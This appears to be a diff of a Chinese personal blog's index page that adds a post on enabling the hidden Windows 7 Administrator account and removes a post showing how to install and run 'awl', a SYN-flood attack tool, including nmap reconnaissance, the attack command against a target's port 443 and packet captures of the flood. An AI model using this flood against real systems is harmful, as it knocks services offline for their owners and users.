@@ -259,6 +259,151 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2010/11/22/what-if-the-local-user-and-group-can-t-find-this-item/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="haitian">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://q1.qlogo.cn/g?b=qq&nk=493654134&s=5">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="haitian的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2010/11/22/what-if-the-local-user-and-group-can-t-find-this-item/" itemprop="url">win7本地用户和组找不到这一项怎么办？</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2010-11-22T11:27:23+08:00">
+                2010-11-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/默认分类/" itemprop="url" rel="index">
+                    <span itemprop="name">默认分类</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>说明你的win7 是 家庭版的。<br>直接在开始菜单运行（按win徽标键和字母R键）框里面输入lusrmgr.msc ，如果不能弹出本地用户和组的界面，说明就是家庭版，或者lusrmgr.msc被精简掉了。<br>超级管理员=ADMINISTRATIOR  </p>
+<p>1.默认状态下有Administrator身份却不能显示出来。需要打开注册表[开始-〉运行-〉regedit，并且你要有管理员权限]在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\<br>下新建注册表项“SpecialAccounts”，再在其下新建子项“UserList”，然后新建一个名为“Administrator”的DWORD(32位)值，将其数值改成“1”（该步骤是要vista认识Administrator身份）；  </p>
+<p>  2.开始，运行cmd，在DOS窗口下输入net user administrator    /active:yes（注意：/前有两个空格！否则运行会提示错误命令；该步骤是激活administrator用户）； （要开机按F8后进安全模式，在管理员权限下才能运行成功）  </p>
+<p>  3.重启计算机或切换用户，这是应该能看到多出来了administrator用户，以administrator身份登陆即可！</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2010/11/18/network-performance-testing-tool-iperf-upper-hand-guide/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1700,148 +1845,6 @@ Script done on Mon 13 Oct 2008 08:48:23 PM CST
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2010/11/08/awl-multi-threaded-syn-attack-tool-0-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="haitian">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://q1.qlogo.cn/g?b=qq&nk=493654134&s=5">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="haitian的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2010/11/08/awl-multi-threaded-syn-attack-tool-0-2/" itemprop="url">awl 多线程SYN攻击工具0.2版</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2010-11-08T13:46:26+08:00">
-                2010-11-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/默认分类/" itemprop="url" rel="index">
-                    <span itemprop="name">默认分类</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>一,安装:<br>tar -zxvf awl-0.2.tar.gz<br>./configure<br>make<br>make install<br>awl的执行程序安装后在/usr/local/bin/目录下<br>二,说明:<br>awl 的格式如下:<br>./awl -i eth0 -m aa:bb:cc:dd:ee:ff -d ip -p port<br>参数如下:<br>-i 发送包的接口,如果省略默认是eth0<br>-m 被攻击机器的mac地址,程序不能根据被攻击IP得到MAC,需要手工指定.先ping 目标IP,再arp -a就可以看到.如果省略则为ff:ff:ff:ff:ff:ff<br>-d 被攻击机器的IP<br>-p 被攻击机器的端口.<br>三,测试,<br>服务器端:centOS 5.0<br>对方服务器:freebsd  6.2  运行apache<br>1,首先得知对方IP<br>运行nmap -v -A 192.168.0.1  查看对方开了啥服务<br>[root@localhost bin]# nmap -v -A 10.122.89.106<br>Starting Nmap 4.11 ( <a href="http://www.insecure.org/nmap/" target="_blank" rel="noopener">http://www.insecure.org/nmap/</a> ) at 2008-06-02 19:24 CST<br>DNS resolution of 1 IPs took 0.39s.<br>Initiating SYN Stealth Scan against 10.122.89.106 [1680 ports] at 19:24<br>Discovered open port 21/tcp on 10.122.89.106<br>Discovered open port 25/tcp on 10.122.89.106<br>Discovered open port 22/tcp on 10.122.89.106<br>Discovered open port 443/tcp on 10.122.89.106<br>Discovered open port 80/tcp on 10.122.89.106<br>Discovered open port 199/tcp on 10.122.89.106<br>Discovered open port 110/tcp on 10.122.89.106<br>Discovered open port 143/tcp on 10.122.89.106<br>Discovered open port 3306/tcp on 10.122.89.106<br>得知对方开了如上端口<br>ping 192.168.0.1  得知mac地址<br>查看arp -a 得知对方IP的MAC地址<br>2.开始攻击:<br>./awl -i eth0 -m aa:bb:cc:dd:ee:ff -d 192.168.0.1 -p 443<br>ping 192.168.0.1 -t 查下对方反应<br>四,测试效果<br>攻击一开始,对方明显挂掉,各种应用无反应,<br>如下是抓包:<br>[root@localhost ~]# tcpdump<br>tcpdump: verbose output suppressed, use -v or -vv for full protocol decode<br>listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes<br>19:26:10.765001 IP 196.224.129.69.58334 &gt; 10.122.82.169.https: S 2137366997:2137366997(0) win 57403<br>19:26:13.835951 IP 221.140.165.45.45259 &gt; 10.122.82.169.https: S 2020705765:2020705765(0) win 28443<br>19:26:14.379435 IP 108.99.168.18.63871 &gt; 10.122.82.169.https: S 1625298749:1625298749(0) win 23981<br>19:26:14.917676 IP 141.90.214.98.34527 &gt; 10.122.82.169.https: S 697113617:697113617(0) win 48400<br>19:26:15.645562 IP 111-104.dsl.sky.cz.33734 &gt; 10.122.82.169.https: S 1620903624:1620903624(0) win 34262<br>19:26:16.396435 IP 135.205.163.109.59589 &gt; 10.122.82.169.https: S 1747490631:1747490631(0) win 40348</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1896,7 +1899,7 @@ Script done on Mon 13 Oct 2008 08:48:23 PM CST
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">277</span>
+                  <span class="site-state-item-count">278</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1907,7 +1910,7 @@ Script done on Mon 13 Oct 2008 08:48:23 PM CST
               
               <div class="site-state-item site-state-categories">
                 
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">分类</span>
                 
               </div>
@@ -1918,7 +1921,7 @@ Script done on Mon 13 Oct 2008 08:48:23 PM CST
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">163</span>
+                  <span class="site-state-item-count">164</span>
                   <span class="site-state-item-name">标签</span>
                 
               </div>
